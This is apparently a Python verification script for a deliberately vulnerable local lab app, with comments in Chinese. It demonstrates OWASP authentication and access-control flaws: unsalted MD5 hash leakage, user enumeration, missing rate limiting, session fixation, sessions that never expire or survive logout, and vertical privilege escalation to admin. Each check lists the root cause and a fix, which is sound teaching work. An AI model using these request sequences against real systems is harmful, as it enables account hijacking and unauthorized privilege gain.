#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_authlab2.py — A07 認證失效 + A01 垂直越權 驗證
=============================================================================
 對應研究報告 CH02.1「發現與驗證分離」與 CH06 S1。

 用法：
   python verify_authlab2.py [port]
=============================================================================
"""

import hashlib
import json
import sys
import time
import urllib.error
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8903
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=10) as r:
            return r.status, r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, owasp, passed, evidence):
    results.append((name, owasp, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 74)
    print("[%s] %s  —  %s" % (mark, name, owasp))
    print("-" * 74)
    for line in evidence.splitlines():
        print("   " + line)


# ---------------------------------------------------------------------------
def w1_weak_hash():
    """W1：無 salt 的 MD5，且可被線上彩虹表還原。"""
    st, body = get("/shadow")
    # md5("123456") = e10adc3949ba59abbe56e057f20f883e
    known = "e10adc3949ba59abbe56e057f20f883e"
    hit = known in body.lower()
    ev = [
        "請求      : GET /shadow",
        "預期漏洞  : 洩漏的雜湊為無 salt MD5，且可用已知值驗證",
        "實際      : HTTP %s，md5('123456') 命中=%s" % (st, hit),
        "驗證方式  : md5('123456') = %s" % hashlib.md5(b"123456").hexdigest(),
        "根因      : 使用無 salt 的 MD5（快速雜湊，不具抗暴力破解能力）",
        "修補方向  : Argon2id / bcrypt / scrypt（自帶 salt、可調成本參數）；",
        "            絕不使用 MD5/SHA-1/SHA-256 等通用雜湊存密碼",
    ]
    check("W1 弱密碼雜湊（無 salt MD5）", "CWE-916", hit, "\n".join(ev))


def w2_user_enum():
    """W2：錯誤訊息區分「使用者不存在」與「密碼錯誤」。"""
    st1, b1 = get("/login?u=nosuchuser&p=x")
    st2, b2 = get("/login?u=alice&p=wrongpass")
    enums = ("no_such_user" in b1) and ("bad_password" in b2)
    ev = [
        "請求 A    : GET /login?u=nosuchuser&p=x   → HTTP %s" % st1,
        "請求 B    : GET /login?u=alice&p=wrongpass → HTTP %s" % st2,
        "預期漏洞  : 兩種失敗回不同的 reason（可據此列舉有效帳號）",
        "實際      : A 含 no_such_user=%s，B 含 bad_password=%s" % (
            "no_such_user" in b1, "bad_password" in b2),
        "根因      : 錯誤訊息暴露「帳號是否存在」",
        "修補方向  : 一律回相同訊息（如「帳號或密碼錯誤」），且回應時間應盡量一致",
    ]
    check("W2 使用者列舉（錯誤訊息不一致）", "A07 / CWE-204", enums, "\n".join(ev))


def w3_no_ratelimit():
    """W3：無速率限制，可無限次嘗試。"""
    attempts = []
    for i in range(8):
        st, body = get("/login?u=alice&p=guess%d" % i)
        attempts.append(st)
    # 最後一次回應應顯示嘗試次數已累積
    st_last, body_last = get("/login?u=alice&p=final")
    unlimited = all(a == 401 for a in attempts)
    # 檢查是否顯示次數且沒有鎖定
    shows_count = "嘗試次數" in body_last
    ev = [
        "請求      : 連續 8 次 GET /login?u=alice&p=guess0..7",
        "預期漏洞  : 全部回 401（無鎖定、無延遲、無驗證碼）",
        "實際      : 8 次皆 401 = %s；回應顯示嘗試次數 = %s" % (unlimited, shows_count),
        "根因      : 沒有任何速率限制或失敗計數鎖定",
        "修補方向  : 指數退避、帳號鎖定、CAPTCHA、IP 速率限制；",
        "            並記錄失敗模式以供警報（A09）",
        "注意      : 本項為「設計層」漏洞——無法用單次請求證明，",
        "            需以「連續嘗試皆成功送出」作為間接證據",
    ]
    check("W3 無速率限制（可暴力破解）", "A07 / CWE-307", unlimited and shows_count, "\n".join(ev))


def w4_session_fixation():
    """W4：可預先指定 session id（會話固定）。"""
    fixed = "FIXEDSID123"
    # 攻擊者先植入一個已知 sid
    st1, b1 = get("/preset?sid=%s&u=1" % fixed)
    # 受害者用同一 sid 登入
    st2, b2 = get("/login?u=alice&p=123456&sid=%s" % fixed)
    # 攻擊者用該 sid 存取
    st3, b3 = get("/whoami?sid=%s" % fixed)
    hijack = (st3 == 200) and ("uid=1" in b3)
    ev = [
        "步驟 1    : GET /preset?sid=%s&u=1        → HTTP %s" % (fixed, st1),
        "步驟 2    : GET /login?u=alice&p=123456&sid=%s → HTTP %s" % (fixed, st2),
        "步驟 3    : GET /whoami?sid=%s              → HTTP %s" % (fixed, st3),
        "預期漏洞  : 登入後仍沿用登入前的 sid → 攻擊者可用同一 sid 冒用身分",
        "實際      : 冒用成功 = %s" % hijack,
        "根因      : 登入成功時未重新產生 session id",
        "修補方向  : 認證狀態改變（登入/提權）時必須重新產生 session id",
    ]
    check("W4 會話固定（Session Fixation）", "A07 / CWE-384", hijack, "\n".join(ev))


def w5_no_expiry():
    """W5：會話無逾時（用同一個 sid 隔一段時間仍有效）。"""
    st1, b1 = get("/login?u=bob&p=password")
    # 從回應取 sid
    import re
    m = re.search(r"sid=<code>([0-9a-f]+)</code>", b1)
    if not m:
        check("W5 過期會話仍有效", "A07 / CWE-613", False, "無法取得 sid")
        return
    sid = m.group(1)
    time.sleep(1.2)
    st2, b2 = get("/whoami?sid=%s" % sid)
    still_valid = st2 == 200
    no_timeout = "無逾時" in b2
    ev = [
        "步驟 1    : GET /login?u=bob&p=password → 取得 sid=%s" % sid,
        "步驟 2    : 等待 1.2 秒",
        "步驟 3    : GET /whoami?sid=%s → HTTP %s" % (sid, st2),
        "預期漏洞  : 會話沒有逾時機制（程式碼中完全沒有檢查 age）",
        "實際      : 仍有效 = %s；頁面明示「無逾時」= %s" % (still_valid, no_timeout),
        "根因      : 建立會話時記錄 created 時間，但讀取時從不檢查",
        "修補方向  : 閒置逾時 + 絕對逾時；並在每次請求更新 last_seen",
        "說明      : 本項以「程式碼中不存在逾時檢查」+「頁面顯示會話年齡」為證據；",
        "            真正的逾時驗證需等待實際逾時週期（通常 15-30 分鐘）",
    ]
    check("W5 過期會話仍有效（無逾時）", "A07 / CWE-613", still_valid and no_timeout, "\n".join(ev))


def w6_logout_ineffective():
    """W6：登出後同一個 sid 仍有效。"""
    st1, b1 = get("/login?u=alice&p=123456")
    import re
    m = re.search(r"sid=<code>([0-9a-f]+)</code>", b1)
    if not m:
        check("W6 登出未真正失效", "A07 / CWE-613", False, "無法取得 sid")
        return
    sid = m.group(1)
    st2, b2 = get("/logout?sid=%s" % sid)
    st3, b3 = get("/whoami?sid=%s" % sid)
    still_valid = st3 == 200
    ev = [
        "步驟 1    : 登入取得 sid=%s" % sid,
        "步驟 2    : GET /logout?sid=%s → HTTP %s" % (sid, st2),
        "步驟 3    : GET /whoami?sid=%s → HTTP %s" % (sid, st3),
        "預期漏洞  : 登出後同一 sid 仍可用（伺服器端未刪除）",
        "實際      : 登出後仍可存取 = %s" % still_valid,
        "根因      : logout 只回應「已登出」，未從 SESSIONS 移除該 sid",
        "修補方向  : 伺服器端確實刪除會話；並使該 sid 立即失效",
    ]
    check("W6 登出未真正失效", "A07 / CWE-613", still_valid, "\n".join(ev))


def w7_vertical_privesc():
    """W7：無授權檢查即可修改任何人的角色。"""
    st1, b1 = get("/update_role?uid=1&role=admin")
    escalated = ("FLAG{vertical_privilege_escalation}" in b1) and st1 == 200
    # 確認資料庫真的被改了
    st2, b2 = get("/shadow")
    changed = "alice" in b2 and "| admin" in b2
    ev = [
        "請求      : GET /update_role?uid=1&role=admin   （alice 提升為 admin）",
        "預期漏洞  : 無需任何授權即可修改角色",
        "實際      : HTTP %s，取得 FLAG=%s" % (st1, escalated),
        "二次確認  : accounts 表中 alice 的 role 已變為 admin = %s" % changed,
        "根因      : update_role 端點完全沒有檢查「請求者是否為 admin」",
        "修補方向  : 加入授權檢查（僅 admin 可改）；且不允許使用者改自己的角色；",
        "            角色變更應記錄稽核日誌",
    ]
    check("W7 垂直越權（提權為 admin）", "A01 / CWE-269", escalated and changed, "\n".join(ev))


def main():
    print("=" * 74)
    print(" AuthLab2 漏洞驗證 — A07 認證失效 / A01 垂直越權")
    print(" 目標：%s" % BASE)
    print("=" * 74)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線 %s（HTTP %s）" % (BASE, st))
        print("       請先啟動：python authlab2.py %d" % PORT)
        sys.exit(1)

    for fn in (w1_weak_hash, w2_user_enum, w3_no_ratelimit, w4_session_fixation,
               w5_no_expiry, w6_logout_ineffective, w7_vertical_privesc):
        try:
            fn()
        except Exception as e:                                # noqa: BLE001
            check(fn.__name__, "-", False, "執行時例外：%s" % e)

    print("\n" + "=" * 74)
    print(" 總結")
    print("=" * 74)
    found = sum(1 for _, _, p, _ in results if p)
    for name, owasp, passed, _ in results:
        print("  %-38s %-20s %s" % (name, owasp, "漏洞存在" if passed else "未觸發"))
    print("-" * 74)
    print("  共 %d/%d 個漏洞被驗證存在" % (found, len(results)))
    print("=" * 74)

    out = [{"name": n, "owasp": o, "present": p} for n, o, p, _ in results]
    with open("authlab2_result.json", "w", encoding="utf-8") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 authlab2_result.json）")


if __name__ == "__main__":
    main()
